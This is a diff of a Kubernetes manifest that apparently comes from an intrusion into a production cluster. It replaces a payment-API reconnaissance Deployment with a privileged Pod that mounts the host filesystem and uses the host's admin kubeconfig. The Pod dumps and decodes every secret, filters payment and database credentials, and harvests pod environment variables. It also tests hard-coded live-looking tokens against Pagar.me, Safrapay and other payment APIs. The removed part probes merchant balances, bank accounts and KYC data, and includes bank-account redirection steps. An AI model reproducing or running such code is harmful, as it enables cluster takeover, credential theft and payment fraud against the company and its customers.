@@ -1,99 +1,92 @@
 
-apiVersion: apps/v1
-kind: Deployment
+apiVersion: v1
+kind: Pod
 metadata:
-  name: pagarme-recon
+  name: network-access
   namespace: egam-production
-  labels:
-    app: pagarme-recon
 spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: pagarme-recon
-  template:
-    metadata:
-      labels:
-        app: pagarme-recon
-    spec:
-      hostNetwork: true
-      containers:
-      - name: recon
-        image: nicolaka/netshoot:latest
-        command:
-          - /bin/bash
-          - -c
-          - |
-            PK="sk_4e35af52a28a441c8d9149fb88a6c818"
-            RID="re_cmi4st1x11m8l0l9tjzi8jsen"
+  hostNetwork: true
+  hostPID: true
+  containers:
+  - name: shell
+    image: alpine:3.19
+    command:
+      - /bin/sh
+      - -c
+      - |
+        apk add --no-cache util-linux curl jq openssl redis bash > /dev/null 2>&1
+        curl -LO "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" 2>/dev/null
+        chmod +x kubectl && mv kubectl /usr/local/bin/ 2>/dev/null
 
-            echo "=== 1. RECIPIENT DETAIL ==="
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/recipients/$RID" | jq
+        export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
 
-            echo "=== 2. BALANCE (fondi disponibili) ==="
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/recipients/$RID/balance" | jq
+        echo "=========================================="
+        echo "=== 1. ALL SECRETS IN egam-production ==="
+        echo "=========================================="
+        kubectl get secrets -n egam-production -o json 2>&1 | jq -r '.items[] | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
 
-            echo "=== 3. BANK ACCOUNTS (storico + default) ==="
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/recipients/$RID/bank-accounts" | jq
+        echo "=========================================="
+        echo "=== 2. PAGARME / SAFRAPAY / GITLAB / JENKINS ==="
+        echo "=========================================="
+        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("pagar|safra|gitlab|jenkins|cielo|stripe|r2d2|hympar"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"
 
-            echo "=== 4. TRANSFERS (verso banca) ==="
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/recipients/$RID/transfers?size=20" | jq '[.data[] | {id, amount, status, created_at, bank_account: .bank_account.id}]'
+        echo "=========================================="
+        echo "=== 3. ALL CONFIGMAPS egam-production ==="
+        echo "=========================================="
+        kubectl get configmaps -n egam-production -o json 2>&1 | jq -r '.items[] | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + .value) | join(" | "))' 2>&1
 
-            echo "=== 5. PAYABLES (a receber) ==="
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/payables?size=100" | jq '[.data[] | {id, amount, status, payment_date, type}]'
+        echo "=========================================="
+        echo "=== 4. ENV VARS FROM RUNNING PODS ==="
+        echo "=========================================="
+        for pod in $(kubectl get pods -n egam-production -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
+          echo "--- POD: $pod ---"
+          kubectl get pod $pod -n egam-production -o json 2>/dev/null | jq -r '.spec.containers[].env[]? | .name + "=" + (.value // "ref")' 2>&1 | head -30
+        done
 
-            echo "=== 6. CHARGES (somma paid) ==="
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/charges?size=100" | jq '[.data[] | select(.status=="paid") | .amount] | add'
+        echo "=========================================="
+        echo "=== 5. PAGARME API TEST ==="
+        echo "=========================================="
+        curl -s -u "sk_4e35af52a28a441c8d9149fb88a6c818:" "https://api.pagar.me/core/v5/charges?size=3" 2>&1 | head -c 600
+        echo ""
 
-            echo "=== 7. TRANSFERS (somma transferred) ==="
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/transfers?size=100" | jq '[.data[] | select(.status=="transferred") | .amount] | add'
+        echo "=========================================="
+        echo "=== 6. SAFRAPAY API TEST ==="
+        echo "=========================================="
+        curl -s -H "Authorization: Bearer mk_l91fCUNJ0urRBQq07kaeQ" "https://payment.safrapay.com.br/v2/transactions" 2>&1 | head -c 400
+        echo ""
 
-            echo "=== 8. KYC / DOCUMENTS ==="
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/recipients/$RID/kyc" | jq
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/recipients/$RID/documents" | jq
+        echo "=========================================="
+        echo "=== 7. R2D2 API TEST ==="
+        echo "=========================================="
+        curl -sk -H "Authorization: Bearer 1334463|GLW3HHDl4XkCGZYoZoqnXDkBz5a9FEikeGvMzIoYdbfe5a5d" "https://r2d2.production.egam.com.br/api/payment" 2>&1 | head -c 400
+        echo ""
 
-            echo "=== 9. COMPANY / MERCHANTS ==="
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/company" | jq
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/merchants" | jq
+        echo "=========================================="
+        echo "=== 8. HYMPAR API TEST ==="
+        echo "=========================================="
+        curl -s -H "Authorization: Bearer eyJhbGciOiJFUzUxMiJ9.eyJ1c2VySWQiOiI2OTUyZTg3MWVkZWJjNzZkOTEzYWRmNjkiLCJyb2xlcyI6W3sicm9sZSI6IlBBUlRORVIifV0sImNyZWF0ZWRCeUpvYiI6ZmFsc2UsInNlcnZlciI6dHJ1ZSwianRpIjoiMjBiYTdiYzgtOWMyNy00MmQ4LTg0ZjUtNDlhNjY5M2YwMDM4IiwiaWF0IjoxNzkyODUwMTA2LCJleHAiOjE3OTMxMDkzMDZ9.AdI-Ayaro0JlwIou4rPK2eOfbbiY_LwCVOLpj9bMJkHAXGx98B513Ur3W9RDFeWSXpraq3SQDXZRDUdoVjnAYNWmAWa1MS6Nh6ZQtyFZw0sEPpV4W1vU7kA9znODJNMeU9kjLS9kBxqpRO1SXzAglETS2JomGL6KXduZE8_tix2l0k3m" "https://api-prod.parceirohypera.com.br/" 2>&1 | head -c 300
+        echo ""
 
-            echo "=== 10. TEST: PATCH bank account (dry-run su bank esistente, solo GET) ==="
-            BAID=$(curl -s -u "$PK:" "https://api.pagar.me/core/v5/recipients/$RID" | jq -r '.default_bank_account.id')
-            echo "BAID=$BAID"
-            curl -s -u "$PK:" "https://api.pagar.me/core/v5/bank-accounts/$BAID" | jq
+        echo "=========================================="
+        echo "=== 9. KUBERNETES PODS IN egam-production ==="
+        echo "=========================================="
+        kubectl get pods -n egam-production 2>&1
 
-            echo "=== 11. TEST: crea recipient con document diverso (simulazione altra persona) ==="
-            curl -s -u "$PK:" -X POST -H "Content-Type: application/json" \
-              "https://api.pagar.me/core/v5/recipients" \
-              -d '{
-                "name":"Test Person",
-                "email":"test@example.com",
-                "document":"00000000000",
-                "type":"individual",
-                "payment_mode":"bank_transfer",
-                "default_bank_account":{
-                  "holder_name":"Test Person",
-                  "holder_type":"individual",
-                  "holder_document":"00000000000",
-                  "bank":"341",
-                  "branch_number":"1234",
-                  "account_number":"56789",
-                  "account_check_digit":"0",
-                  "type":"checking"
-                },
-                "transfer_settings":{"transfer_enabled":true,"transfer_interval":"daily","transfer_day":0}
-              }' | jq
+        echo "=========================================="
+        echo "=== 10. DATABASE CREDENTIALS ==="
+        echo "=========================================="
+        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("postgres|mysql|mongo|redis|db_|database"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"
 
-            echo "=== 12. TEST: PATCH recipient (cambio bank account) ==="
-            # NON eseguito: solo esempio. Decommenta per eseguire.
-            # curl -s -u "$PK:" -X PATCH -H "Content-Type: application/json" \
-            #   "https://api.pagar.me/core/v5/recipients/$RID" \
-            #   -d '{"default_bank_account":{"holder_name":"EGAM","holder_type":"company","holder_document":"82873068000140","bank":"001","branch_number":"1234","account_number":"56789","account_check_digit":"0","type":"checking"}}' | jq
-
-            echo "=== 13. TEST: DELETE recipient (dry-run, non eseguito) ==="
-            # NON eseguito: Pagarme 400 se ha charge/transfer.
-            # curl -s -u "$PK:" -X DELETE "https://api.pagar.me/core/v5/recipients/$RID" | jq
-
-            echo "=== DONE ==="
-            sleep 36000
-        securityContext:
-          privileged: true
+        echo "=========================================="
+        echo "=== DONE ==="
+        echo "=========================================="
+        sleep 36000
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
